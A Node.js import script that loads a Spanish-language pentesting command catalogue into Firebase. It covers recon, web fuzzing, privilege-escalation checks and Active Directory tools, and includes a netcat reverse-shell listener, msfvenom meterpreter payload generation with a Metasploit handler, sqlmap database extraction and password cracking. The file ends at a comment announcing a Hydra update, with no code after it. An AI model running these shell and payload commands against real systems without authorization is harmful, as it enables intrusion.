/**
 * Importa el lote de contenidos enviado por el usuario al nodo `contenidos`.
 *
 * - 51 contenidos nuevos (comandos y 2 estrategias) con IDs C007..C057.
 * - Actualiza C0006 (Hydra) con la version corregida del mismo lote.
 * - Es idempotente: al reejecutar conserva creadoEn/creadoPor.
 *
 * Uso:
 *   node scripts/importar-contenidos.mjs --dry   # solo muestra lo que haria
 *   node scripts/importar-contenidos.mjs         # escribe en Firebase
 */
import { dbRequest } from './firebase-admin.mjs';

const DRY_RUN = process.argv.includes('--dry');
const AHORA = Date.now();

const NUEVOS = [
  {
    tipo: 'comando',
    titulo: 'Escaneo sigiloso SYN',
    categoria: 'RECON',
    plataformas: ['linux', 'macos'],
    resumen:
      'Realiza un escaneo de puertos SYN sin completar el handshake TCP de 3 vías.',
    cuerpo: 'sudo nmap -sS -p- <IP>',
    ejemplo: 'sudo nmap -sS -p 1-1000 192.168.1.50',
    dificultad: 'intermedio',
    tags: ['nmap', 'syn', 'escaneo', 'puertos'],
    riesgo: 'medio',
    advertencia: 'Escanea solo redes propias o con autorización por escrito.',
    nota: 'Requiere privilegios de root.',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración de directorios con ffuf',
    categoria: 'WEB',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Herramienta rápida de fuzzing web para descubrir rutas ocultas y archivos.',
    cuerpo: 'ffuf -u http://<IP>/FUZZ -w <WORDLIST>',
    ejemplo:
      'ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt',
    dificultad: 'intermedio',
    tags: ['web', 'fuzzing', 'ffuf', 'directorios'],
    riesgo: 'bajo',
    advertencia: 'Puede generar alto tráfico en el servidor web objetivo.',
    nota: 'Utiliza la palabra FUZZ como marcador de posición para las rutas.',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo de vulnerabilidades con Nikto',
    categoria: 'WEB',
    plataformas: ['linux', 'macos'],
    resumen:
      'Escanea servidores web en busca de archivos peligrosos, CGIs desactualizados y malas configuraciones.',
    cuerpo: 'nikto -h http://<IP>',
    ejemplo: 'nikto -h http://192.168.1.50',
    dificultad: 'basico',
    tags: ['web', 'nikto', 'escaneo', 'vulnerabilidades'],
    riesgo: 'medio',
    advertencia:
      'Las peticiones quedan altamente registradas en los logs del servidor web.',
  },
  {
    tipo: 'comando',
    titulo: 'Explotación automatizada de SQLi con sqlmap',
    categoria: 'WEB',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Detecta y explota vulnerabilidades de inyección SQL de forma automatizada.',
    cuerpo: 'sqlmap -u "http://<IP>/page.php?id=1" --dbs',
    ejemplo: 'sqlmap -u "http://192.168.1.20/vuln.php?id=1" --dbs --batch',
    dificultad: 'avanzado',
    tags: ['sql', 'sqlmap', 'inyeccion', 'bases'],
    riesgo: 'alto',
    advertencia:
      'Modifica y extrae datos de la base de datos objetivo; utilícese únicamente con autorización explícita.',
    nota: 'El parámetro --batch evita que se detenga pidiendo confirmación interactiva.',
  },
  {
    tipo: 'comando',
    titulo: 'Transferencia de archivos con Netcat',
    categoria: 'NETWORKING',
    plataformas: ['linux', 'windows', 'macos'],
    resumen:
      'Permite enviar y recibir archivos o establecer conexiones raw a través de TCP/UDP.',
    cuerpo: 'nc -lvnp <PUERTO> > <ARCHIVO>',
    ejemplo: 'nc -lvnp 4444 > payload.sh',
    dificultad: 'basico',
    tags: ['netcat', 'transferencia', 'red', 'nc'],
    riesgo: 'medio',
    advertencia:
      'Las transferencias de red con netcat no están cifradas por defecto.',
    nota: 'En el equipo origen se ejecuta: nc <IP> <PUERTO> < <ARCHIVO>',
  },
  {
    tipo: 'comando',
    titulo: 'Escucha de reverse shell con Netcat',
    categoria: 'SECURITY',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Abre un puerto local para recibir una conexión inversa (reverse shell) desde un sistema comprometido.',
    cuerpo: 'nc -lvnp <PUERTO>',
    ejemplo: 'nc -lvnp 443',
    dificultad: 'basico',
    tags: ['netcat', 'shell', 'reverse', 'escucha'],
    riesgo: 'alto',
    advertencia:
      'Manejar con precaución entornos de red expuestos a internet.',
  },
  {
    tipo: 'comando',
    titulo: 'Extracción de información DNS con Dig',
    categoria: 'RECON',
    plataformas: ['linux', 'macos'],
    resumen:
      'Realiza consultas detalladas a servidores de nombres DNS para obtener registros A, MX, NS, TXT.',
    cuerpo: 'dig @<DNS> <DOMINIO> any',
    ejemplo: 'dig @8.8.8.8 example.com any',
    dificultad: 'basico',
    tags: ['dns', 'dig', 'recon', 'registros'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Búsqueda de información de dominios con Whois',
    categoria: 'RECON',
    plataformas: ['linux', 'macos'],
    resumen:
      'Consulta bases de datos de registros de dominios para obtener propietarios, fechas de creación y servidores DNS.',
    cuerpo: 'whois <DOMINIO>',
    ejemplo: 'whois example.com',
    dificultad: 'basico',
    tags: ['whois', 'recon', 'dominio', 'osint'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración de recursos SMB con Enum4linux',
    categoria: 'ACTIVE_DIRECTORY',
    plataformas: ['linux'],
    resumen:
      'Automatiza la enumeración de recursos compartidos, usuarios, grupos y políticas de contraseñas en servidores SMB/Samba.',
    cuerpo: 'enum4linux -a <IP>',
    ejemplo: 'enum4linux -a 192.168.1.15',
    dificultad: 'intermedio',
    tags: ['smb', 'enum4linux', 'windows', 'red'],
    riesgo: 'medio',
    advertencia:
      'Genera múltiples conexiones concurrentes al servicio SMB.',
    nota: 'Requiere Perl y dependencias asociadas en sistemas Linux.',
  },
  {
    tipo: 'comando',
    titulo: 'Conexión interactiva a recurso SMB',
    categoria: 'ACTIVE_DIRECTORY',
    plataformas: ['linux', 'windows'],
    resumen:
      'Permite conectarse a recursos compartidos SMB para listar y descargar archivos.',
    cuerpo: 'smbclient //<IP>/<RECURSO> -U <USUARIO>',
    ejemplo: 'smbclient //192.168.1.15/share -U administrator',
    dificultad: 'intermedio',
    tags: ['smb', 'smbclient', 'compartir', 'archivos'],
    riesgo: 'medio',
    advertencia:
      'Las credenciales pueden viajar en texto claro si no se fuerza SMB firmado o seguro.',
    nota: 'Permite usar credenciales vacías con -N.',
  },
  {
    tipo: 'comando',
    titulo: 'Conexión remota a WinRM con Evil-WinRM',
    categoria: 'ACTIVE_DIRECTORY',
    plataformas: ['linux'],
    resumen:
      'Shell interactiva altamente eficiente sobre Windows Remote Management (WinRM) para pentesters.',
    cuerpo: 'evil-winrm -i <IP> -u <USUARIO> -p <CONTRASEÑA>',
    ejemplo: 'evil-winrm -i 192.168.1.50 -u administrator -p Password123',
    dificultad: 'avanzado',
    tags: ['winrm', 'evil-winrm', 'windows', 'powershell'],
    riesgo: 'alto',
    advertencia:
      'Proporciona acceso administrativo completo si se usan credenciales privilegiadas.',
    nota: 'Admite inyección de scripts en memoria con el parámetro -s.',
  },
  {
    tipo: 'comando',
    titulo: 'Auditoría local de privilegios Linux con LinPEAS',
    categoria: 'PRIVESC',
    plataformas: ['linux'],
    resumen:
      'Script automatizado que busca vectores de escalada de privilegios en sistemas Linux.',
    cuerpo: './linpeas.sh',
    ejemplo: './linpeas.sh -a > output.txt',
    dificultad: 'intermedio',
    tags: ['linpeas', 'privesc', 'linux', 'auditoria'],
    riesgo: 'medio',
    advertencia:
      'Ejecutar scripts automatizados puede modificar el estado del sistema o dejar rastros en logs.',
    nota: 'Se recomienda redirigir la salida a un archivo para su análisis detallado.',
  },
  {
    tipo: 'comando',
    titulo: 'Auditoría local de privilegios Windows con WinPEAS',
    categoria: 'PRIVESC',
    plataformas: ['windows'],
    resumen:
      'Script ejecutable que analiza configuraciones erróneas y vectores de escalada en Windows.',
    cuerpo: 'winpeas.exe',
    ejemplo: 'winpeas.exe quiet cmd info',
    dificultad: 'intermedio',
    tags: ['winpeas', 'privesc', 'windows', 'auditoria'],
    riesgo: 'medio',
    advertencia:
      'Los antivirus modernos suelen detectar y bloquear este binario inmediatamente.',
  },
  {
    tipo: 'comando',
    titulo: 'Descifrado de hashes con Hashcat',
    categoria: 'CRYPTO',
    plataformas: ['linux', 'windows', 'macos'],
    resumen:
      'Utilidad de recuperación de contraseñas mediante fuerza bruta y ataques de diccionario acelerados por GPU.',
    cuerpo: 'hashcat -m <TIPO_HASH> -a 0 <HASHES> <WORDLIST>',
    ejemplo: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
    dificultad: 'avanzado',
    tags: ['hashcat', 'crypto', 'hashes', 'passwords'],
    riesgo: 'alto',
    advertencia:
      'El uso intensivo de la GPU puede generar altas temperaturas en el hardware.',
    nota: 'El parámetro -m especifica el tipo de hash (ej. 0 para MD5).',
  },
  {
    tipo: 'comando',
    titulo: 'Descifrado básico con John the Ripper',
    categoria: 'CRYPTO',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Herramienta clásica de auditoría de contraseñas y descifrado de hashes basada en CPU.',
    cuerpo: 'john --wordlist=<WORDLIST> <ARCHIVO_HASHES>',
    ejemplo: 'john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt',
    dificultad: 'intermedio',
    tags: ['john', 'crypto', 'passwords', 'hashes'],
    riesgo: 'medio',
    nota: 'Usa --show para ver las contraseñas ya descifradas previamente.',
  },
  {
    tipo: 'comando',
    titulo: 'Captura de paquetes con Tcpdump',
    categoria: 'NETWORKING',
    plataformas: ['linux', 'macos'],
    resumen:
      'Analizador de paquetes por línea de comandos para interceptar y mostrar tráfico de red.',
    cuerpo: 'sudo tcpdump -i <INTERFAZ> -nnvvS',
    ejemplo: 'sudo tcpdump -i eth0 -nnvvS port 80',
    dificultad: 'intermedio',
    tags: ['tcpdump', 'redes', 'trafico', 'captura'],
    riesgo: 'medio',
    advertencia:
      'Puede capturar información sensible (credenciales en texto claro) si no se filtra adecuadamente.',
    nota: 'Requiere privilegios de superusuario.',
  },
  {
    tipo: 'comando',
    titulo: 'Descubrimiento de hosts con Arp-scan',
    categoria: 'RECON',
    plataformas: ['linux'],
    resumen:
      'Realiza descubrimientos de dispositivos en la red local mediante peticiones ARP.',
    cuerpo: 'sudo arp-scan -l',
    ejemplo: 'sudo arp-scan --interface=eth0 --localnet',
    dificultad: 'basico',
    tags: ['arp', 'recon', 'red', 'host'],
    riesgo: 'bajo',
    advertencia:
      'Solo funciona en el segmento de red local directamente conectado.',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo rápido de puertos con Masscan',
    categoria: 'RECON',
    plataformas: ['linux', 'macos'],
    resumen:
      'Escáner de puertos masivo capaz de escanear todo Internet en minutos.',
    cuerpo: 'sudo masscan -p1-65535 <IP_RANGO> --rate=1000',
    ejemplo: 'sudo masscan -p1-65535 192.168.1.0/24 --rate=5000',
    dificultad: 'avanzado',
    tags: ['masscan', 'puertos', 'escaneo', 'rapido'],
    riesgo: 'alto',
    advertencia:
      'Tasas de paquetes muy altas pueden saturar routers domésticos o redes corporativas.',
    nota: 'Requiere especificar una tasa (--rate) adecuada para evitar pérdida de paquetes.',
  },
  {
    tipo: 'comando',
    titulo: 'Creación de payloads con Msfvenom',
    categoria: 'SECURITY',
    plataformas: ['linux', 'windows', 'macos'],
    resumen:
      'Genera payloads personalizados y ejecutables maliciosos para múltiples plataformas y arquitecturas.',
    cuerpo:
      'msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PUERTO> -f <FORMATO> -o <ARCHIVO>',
    ejemplo:
      'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe',
    dificultad: 'avanzado',
    tags: ['msfvenom', 'metasploit', 'payload', 'exploit'],
    riesgo: 'alto',
    advertencia:
      'Los binarios generados son detectados casi de inmediato por soluciones EDR y antivirus tradicionales.',
  },
  {
    tipo: 'comando',
    titulo: 'Escucha multi-plataforma con Metasploit Handler',
    categoria: 'SECURITY',
    plataformas: ['linux', 'windows', 'macos'],
    resumen:
      'Configura un manejador de conexiones para recibir sesiones de Meterpreter u otros payloads.',
    cuerpo:
      'msfconsole -x "use exploit/multi/handler; set PAYLOAD <PAYLOAD>; set LHOST <IP>; set LPORT <PUERTO>; exploit"',
    ejemplo:
      'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; exploit"',
    dificultad: 'avanzado',
    tags: ['metasploit', 'handler', 'exploit', 'listener'],
    riesgo: 'alto',
  },
  {
    tipo: 'comando',
    titulo: 'Análisis forense de memoria con Volatility',
    categoria: 'FORENSE',
    plataformas: ['linux', 'windows', 'macos'],
    resumen:
      'Framework avanzado para la extracción y análisis de artefactos digitales desde volcado de memoria RAM.',
    cuerpo: 'python3 vol.py -f <MEMORIA> windows.info',
    ejemplo: 'python3 vol.py -f memory.raw windows.info',
    dificultad: 'avanzado',
    tags: ['forense', 'memoria', 'volatility', 'ram'],
    riesgo: 'bajo',
    nota: 'Requiere la versión correcta de Volatility (Volatility 3 recomendado).',
  },
  {
    tipo: 'comando',
    titulo: 'Extracción de metadatos con Exiftool',
    categoria: 'RECON',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Lee y edita metadatos ocultos en archivos de imagen, documentos y multimedia.',
    cuerpo: 'exiftool <ARCHIVO>',
    ejemplo: 'exiftool imagen.jpg',
    dificultad: 'basico',
    tags: ['exiftool', 'recon', 'metadatos', 'osint'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo de vulnerabilidades web con Nuclei',
    categoria: 'WEB',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Escáner de vulnerabilidades basado en plantillas YAML altamente personalizables y veloces.',
    cuerpo: 'nuclei -u http://<IP>',
    ejemplo: 'nuclei -u https://example.com -t cves/',
    dificultad: 'intermedio',
    tags: ['nuclei', 'web', 'vulnerabilidades', 'yaml'],
    riesgo: 'medio',
    advertencia:
      'Puede realizar peticiones masivas dependiendo de las plantillas seleccionadas.',
    nota: 'Actualizar plantillas regularmente con nuclei -update-templates.',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración de directorios y archivos con Gobuster',
    categoria: 'WEB',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Herramienta escrita en Go para la búsqueda rápida de directorios, archivos y subdominios web.',
    cuerpo: 'gobuster dir -u http://<IP> -w <WORDLIST>',
    ejemplo:
      'gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt',
    dificultad: 'intermedio',
    tags: ['gobuster', 'web', 'directorios', 'fuzzing'],
    riesgo: 'medio',
    advertencia:
      'Genera gran cantidad de registros en los servidores web monitoreados.',
    nota: 'Utiliza el modo v (-v) para ver rutas detalladas.',
  },
  {
    tipo: 'comando',
    titulo: 'Búsqueda de subdominios con Sublist3r',
    categoria: 'RECON',
    plataformas: ['linux'],
    resumen:
      'Herramienta basada en Python para enumerar subdominios utilizando motores de búsqueda y fuentes OSINT.',
    cuerpo: 'python3 sublist3r.py -d <DOMINIO>',
    ejemplo: 'python3 sublist3r.py -d example.com',
    dificultad: 'basico',
    tags: ['sublist3r', 'recon', 'subdominios', 'osint'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Auditoría de redes Wi-Fi con Aircrack-ng',
    categoria: 'SECURITY',
    plataformas: ['linux'],
    resumen:
      'Suite completa de herramientas para evaluar la seguridad de redes inalámbricas 802.11 WEP/WPA/WPA2.',
    cuerpo: 'aircrack-ng -w <WORDLIST> <CAPTURA.cap>',
    ejemplo: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
    dificultad: 'avanzado',
    tags: ['wifi', 'aircrack', 'wireless', 'redes'],
    riesgo: 'alto',
    advertencia:
      'El uso de herramientas de monitorización y auditoría Wi-Fi requiere autorización explícita y puede afectar redes ajenas.',
    nota: 'Requiere una tarjeta de red compatible con modo monitor.',
  },
  {
    tipo: 'comando',
    titulo: 'Activación de modo monitor en interfaz inalámbrica',
    categoria: 'SECURITY',
    plataformas: ['linux'],
    resumen:
      'Configura una tarjeta de red inalámbrica en modo monitor para capturar tráfico de aire.',
    cuerpo: 'sudo airmon-ng start <INTERFAZ>',
    ejemplo: 'sudo airmon-ng start wlan0',
    dificultad: 'intermedio',
    tags: ['wifi', 'airmon', 'monitor', 'redes'],
    riesgo: 'medio',
    advertencia:
      'Desconecta temporalmente la interfaz de red de conexiones normales.',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo avanzado con Unicornscan',
    categoria: 'RECON',
    plataformas: ['linux'],
    resumen:
      'Motor de recolección de información y escaneo de puertos diseñado para escalabilidad y velocidad.',
    cuerpo: 'sudo unicornscan -mTv <IP>',
    ejemplo: 'sudo unicornscan -mTv 192.168.1.10',
    dificultad: 'avanzado',
    tags: ['unicornscan', 'recon', 'puertos', 'escaneo'],
    riesgo: 'medio',
  },
  {
    tipo: 'comando',
    titulo: 'Análisis de seguridad en contenedores con Trivy',
    categoria: 'CLOUD',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Escáner de vulnerabilidades integral para contenedores, sistemas de archivos y repositorios Git.',
    cuerpo: 'trivy image <IMAGEN>',
    ejemplo: 'trivy image python:3.9-alpine',
    dificultad: 'basico',
    tags: ['trivy', 'cloud', 'docker', 'contenedores'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Auditoría de seguridad cloud con ScoutSuite',
    categoria: 'CLOUD',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Herramienta multiplataforma de auditoría multi-cloud (AWS, Azure, GCP) para detectar malas configuraciones.',
    cuerpo: 'scout aws',
    ejemplo: 'scout aws --profile default',
    dificultad: 'avanzado',
    tags: ['cloud', 'aws', 'scoutsuite', 'auditoria'],
    riesgo: 'medio',
    advertencia:
      'Requiere permisos de lectura en la infraestructura cloud evaluada.',
  },
  {
    tipo: 'comando',
    titulo: 'Peticiones HTTP personalizadas con Curl',
    categoria: 'WEB',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Realiza peticiones HTTP personalizadas para probar endpoints de APIs y aplicaciones web.',
    cuerpo: 'curl -X POST -d "param=value" http://<IP>/endpoint',
    ejemplo: 'curl -X GET http://192.168.1.50/api/users',
    dificultad: 'basico',
    tags: ['curl', 'web', 'api', 'http'],
    riesgo: 'bajo',
    nota: 'El parámetro -i muestra las cabeceras de respuesta HTTP.',
  },
  {
    tipo: 'comando',
    titulo: 'Escalada por binarios SUID en Linux',
    categoria: 'PRIVESC',
    plataformas: ['linux'],
    resumen:
      'Busca archivos ejecutables con el bit SUID activado que permitan escalar privilegios a root.',
    cuerpo: 'find / -perm -4000 2>/dev/null',
    ejemplo:
      'find / -user root -perm -4000 -exec ls -ld {} \\; 2>/dev/null',
    dificultad: 'intermedio',
    tags: ['suid', 'privesc', 'linux', 'permisos'],
    riesgo: 'medio',
  },
  {
    tipo: 'comando',
    titulo: 'Búsqueda de capacidades en binarios Linux',
    categoria: 'PRIVESC',
    plataformas: ['linux'],
    resumen:
      'Identifica binarios con capacidades de Linux asignadas que puedan ser abusadas.',
    cuerpo: 'getcap -r / 2>/dev/null',
    ejemplo: 'getcap -r /usr/bin/ 2>/dev/null',
    dificultad: 'intermedio',
    tags: ['capabilities', 'privesc', 'linux', 'binarios'],
    riesgo: 'medio',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración de tareas cron en Linux',
    categoria: 'PRIVESC',
    plataformas: ['linux'],
    resumen:
      'Revisa tareas programadas en el sistema que puedan ejecutar scripts modificables por usuarios sin privilegios.',
    cuerpo: 'cat /etc/crontab',
    ejemplo: 'ls -la /etc/cron.d/',
    dificultad: 'basico',
    tags: ['cron', 'privesc', 'linux', 'tareas'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Verificación de permisos de sudo sin contraseña',
    categoria: 'PRIVESC',
    plataformas: ['linux'],
    resumen:
      'Muestra los comandos que el usuario actual puede ejecutar como root mediante sudo.',
    cuerpo: 'sudo -l',
    ejemplo: 'sudo -l',
    dificultad: 'basico',
    tags: ['sudo', 'privesc', 'linux', 'permisos'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Consulta de privilegios de usuario en Windows con Whoami',
    categoria: 'PRIVESC',
    plataformas: ['windows'],
    resumen:
      'Muestra el usuario actual, sus grupos de seguridad y privilegios asignados.',
    cuerpo: 'whoami /priv',
    ejemplo: 'whoami /all',
    dificultad: 'basico',
    tags: ['whoami', 'windows', 'privesc', 'privilegios'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración de parches y actualizaciones en Windows',
    categoria: 'PRIVESC',
    plataformas: ['windows'],
    resumen:
      'Consulta las actualizaciones de seguridad instaladas en el sistema operativo Windows.',
    cuerpo: 'systeminfo',
    ejemplo: 'wmic qfe get HotFixID,InstalledOn',
    dificultad: 'basico',
    tags: ['systeminfo', 'windows', 'parches', 'enumeracion'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Creación de túnel SSH inverso',
    categoria: 'NETWORKING',
    plataformas: ['linux', 'macos'],
    resumen:
      'Permite redirigir puertos a través de una conexión SSH para saltar firewalls o NATs.',
    cuerpo:
      'ssh -R <PUERTO_REMOTO>:localhost:<PUERTO_LOCAL> <USUARIO>@<SERVIDOR>',
    ejemplo: 'ssh -R 8080:localhost:80 user@192.168.1.100',
    dificultad: 'avanzado',
    tags: ['ssh', 'tunel', 'redes', 'portforwarding'],
    riesgo: 'alto',
    advertencia:
      'Requiere acceso SSH autorizado al servidor remoto de salto.',
    nota: 'El parámetro -N evita que se abra una shell interactiva en el destino.',
  },
  {
    tipo: 'comando',
    titulo: 'Redirección local de puertos con SSH',
    categoria: 'NETWORKING',
    plataformas: ['linux', 'macos'],
    resumen:
      'Conecta un puerto local a un servicio remoto a través de un túnel cifrado SSH.',
    cuerpo:
      'ssh -L <PUERTO_LOCAL>:<HOST_DESTINO>:<PUERTO_DESTINO> <USUARIO>@<SERVIDOR>',
    ejemplo: 'ssh -L 8080:10.0.0.5:80 user@192.168.1.50',
    dificultad: 'avanzado',
    tags: ['ssh', 'portforwarding', 'redes', 'tunel'],
    riesgo: 'medio',
  },
  {
    tipo: 'estrategia',
    titulo: 'Metodología de auditoría web OWASP',
    categoria: 'WEB',
    plataformas: ['web'],
    resumen:
      'Enfoque estructurado para evaluar la seguridad de aplicaciones web cubriendo el Top 10 de OWASP.',
    dificultad: 'intermedio',
    tags: ['owasp', 'web', 'metodologia', 'auditoria'],
    riesgo: 'bajo',
    advertencia:
      'Seguir estrictamente el alcance acordado en el contrato de pruebas.',
    pasos: [
      {
        titulo: 'Reconocimiento y mapeo',
        detalle:
          'Descubrir puntos de entrada, tecnologías y parámetros expuestos.',
        comando: 'ffuf -u http://<IP>/FUZZ -w <WORDLIST>',
      },
      {
        titulo: 'Análisis de autenticación y sesiones',
        detalle: 'Comprobar la robustez de tokens, cookies y flujos de login.',
        comando: 'curl -i http://<IP>/login',
      },
      {
        titulo: 'Prueba de vulnerabilidades comunes',
        detalle: 'Evaluar Inyección SQL, XSS, SSRF y control de acceso.',
        comando: 'sqlmap -u "http://<IP>/item.php?id=1" --dbs',
      },
    ],
  },
  {
    tipo: 'estrategia',
    titulo: 'Auditoría de seguridad en entornos Active Directory',
    categoria: 'ACTIVE_DIRECTORY',
    plataformas: ['windows'],
    resumen:
      'Estrategia sistemática para evaluar dominios de Active Directory desde cuentas de usuario estándar.',
    dificultad: 'avanzado',
    tags: ['active_directory', 'windows', 'auditoria', 'pentesting'],
    riesgo: 'medio',
    advertencia:
      'Operaciones de recolección masiva pueden generar alertas en sistemas SIEM corporativos.',
    pasos: [
      {
        titulo: 'Recolección de información del dominio',
        detalle: 'Enumerar usuarios, grupos y políticas de contraseñas.',
        comando: 'enum4linux -a <IP>',
      },
      {
        titulo: 'Búsqueda de objetos vulnerables',
        detalle:
          'Identificar cuentas con privilegios de delegación o contraseñas débiles.',
        comando: 'evil-winrm -i <IP> -u <USUARIO> -p <CONTRASEÑA>',
      },
    ],
  },
  {
    tipo: 'comando',
    titulo: 'Análisis de tráfico con Wireshark Tshark',
    categoria: 'NETWORKING',
    plataformas: ['linux', 'macos', 'windows'],
    resumen:
      'Versión de línea de comandos de Wireshark para capturar y filtrar paquetes en tiempo real.',
    cuerpo: 'tshark -i <INTERFAZ> -f "<FILTRO>"',
    ejemplo: 'tshark -i eth0 -f "tcp port 80"',
    dificultad: 'intermedio',
    tags: ['tshark', 'wireshark', 'redes', 'trafico'],
    riesgo: 'medio',
  },
  {
    tipo: 'comando',
    titulo: 'Generación de certificados autofirmados con OpenSSL',
    categoria: 'CRYPTO',
    plataformas: ['linux', 'macos'],
    resumen:
      'Crea certificados SSL/TLS para pruebas de laboratorio o servicios cifrados locales.',
    cuerpo:
      'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365',
    ejemplo:
      'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes',
    dificultad: 'basico',
    tags: ['openssl', 'crypto', 'ssl', 'tls'],
    riesgo: 'bajo',
    advertencia:
      'Los navegadores marcarán el certificado como no confiable por defecto.',
    nota: 'El parámetro -nodes evita proteger la clave privada con contraseña.',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo de vulnerabilidades en CMS WordPress con Wpscan',
    categoria: 'WEB',
    plataformas: ['linux', 'macos'],
    resumen:
      'Escáner especializado en la detección de vulnerabilidades en núcleos, plugins y temas de WordPress.',
    cuerpo: 'wpscan --url http://<IP>',
    ejemplo: 'wpscan --url http://192.168.1.50/wordpress --enumerate p',
    dificultad: 'intermedio',
    tags: ['wpscan', 'wordpress', 'web', 'cms'],
    riesgo: 'medio',
    advertencia:
      'Realizar escaneos intensivos puede sobrecargar sitios WordPress de producción.',
    nota: 'Se recomienda usar una API token de Wpscan para obtener bases de datos de vulnerabilidades actualizadas.',
  },
  {
    tipo: 'comando',
    titulo: 'Conversión de formatos de claves SSH con PuttyGen',
    categoria: 'CRYPTO',
    plataformas: ['linux', 'windows'],
    resumen:
      'Convierte claves privadas OpenSSH al formato PPK compatible con PuTTY y viceversa.',
    cuerpo: 'puttygen <CLAVE> -o <SALIDA>',
    ejemplo: 'puttygen id_rsa -o id_rsa.ppk',
    dificultad: 'basico',
    tags: ['puttygen', 'crypto', 'ssh', 'llaves'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Análisis estático de binarios con Readelf',
    categoria: 'LINUX',
    plataformas: ['linux'],
    resumen:
      'Muestra información detallada sobre archivos ejecutables ELF en sistemas Linux.',
    cuerpo: 'readelf -h <BINARIO>',
    ejemplo: 'readelf -S /bin/ls',
    dificultad: 'avanzado',
    tags: ['readelf', 'linux', 'binarios', 'elf'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Inspección de dependencias y símbolos con Strings',
    categoria: 'LINUX',
    plataformas: ['linux', 'macos'],
    resumen:
      'Extrae cadenas de texto legibles de archivos binarios o volcados de memoria.',
    cuerpo: 'strings <ARCHIVO>',
    ejemplo: 'strings malware.bin | grep -i "http"',
    dificultad: 'basico',
    tags: ['strings', 'linux', 'binarios', 'analisis'],
    riesgo: 'bajo',
  },
  {
    tipo: 'comando',
    titulo: 'Montaje de recursos compartidos NFS en Linux',
    categoria: 'NETWORKING',
    plataformas: ['linux'],
    resumen:
      'Permite montar directorios exportados mediante Network File System (NFS) de forma local.',
    cuerpo: 'sudo mount -t nfs <IP>:/<EXPORT> /mnt/nfs',
    ejemplo: 'sudo mount -t nfs 192.168.1.20:/share /mnt/nfs',
    dificultad: 'intermedio',
    tags: ['nfs', 'linux', 'montar', 'red'],
    riesgo: 'medio',
    advertencia:
      'Requiere permisos de superusuario y conectividad al puerto NFS.',
  },
  {
    tipo: 'comando',
    titulo: 'Consulta de sesiones activas en SMB con Rpcclient',
    categoria: 'ACTIVE_DIRECTORY',
    plataformas: ['linux'],
    resumen:
      'Cliente RPC interactivo para consultar información detallada de sistemas Windows y Active Directory.',
    cuerpo: 'rpcclient -U "" <IP>',
    ejemplo: 'rpcclient -U "" 192.168.1.15',
    dificultad: 'avanzado',
    tags: ['rpcclient', 'smb', 'windows', 'active_directory'],
    riesgo: 'medio',
    nota: 'Permite conexiones anónimas utilizando comillas vacías en el parámetro de usuario.',
  },
  {
    tipo: 'comando',
    titulo: 'Escaneo de puertos UDP con Nmap',
    categoria: 'RECON',
    plataformas: ['linux', 'macos'],
    resumen:
      'Ejecuta un escaneo de puertos UDP para identificar servicios críticos expuestos (DNS, SNMP, NTP).',
    cuerpo: 'sudo nmap -sU -p <PUERTOS> <IP>',
    ejemplo: 'sudo nmap -sU -p 53,123,161 192.168.1.10',
    dificultad: 'intermedio',
    tags: ['nmap', 'udp', 'escaneo', 'puertos'],
    riesgo: 'medio',
    advertencia:
      'Los escaneos UDP son notablemente más lentos y propensos a falsos positivos debido a filtrados ICMP.',
    nota: 'Requiere privilegios de root.',
  },
  {
    tipo: 'comando',
    titulo: 'Enumeración SNMP con Onesixtyone',
    categoria: 'RECON',
    plataformas: ['linux'],
    resumen:
      'Escáner SNMP rápido capaz de adivinar comunidades SNMP predeterminadas (public, private).',
    cuerpo: 'onesixtyone -c <COMUNIDADES> <IP>',
    ejemplo:
      'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.25',
    dificultad: 'intermedio',
    tags: ['snmp', 'onesixtyone', 'recon', 'comunidades'],
    riesgo: 'medio',
    advertencia:
      'SNMP expuesto puede revelar información crítica de la red corporativa.',
  },
];

/** Actualizacion del Hydra ya existente (C0006), con los placeholders corregidos. */
